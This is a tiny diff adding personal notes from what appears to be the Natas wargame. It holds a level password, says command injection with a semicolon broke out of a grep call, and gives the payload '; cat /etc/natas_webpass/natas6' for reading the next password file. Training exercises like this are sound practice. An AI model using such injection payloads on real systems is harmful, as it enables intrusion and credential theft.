@@ -1,0 +1,6 @@
+t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+
+I used command injection with an ; before to break out of the grep command
+
+; cat /etc/natas_webpass/natas6
+prints out the pass
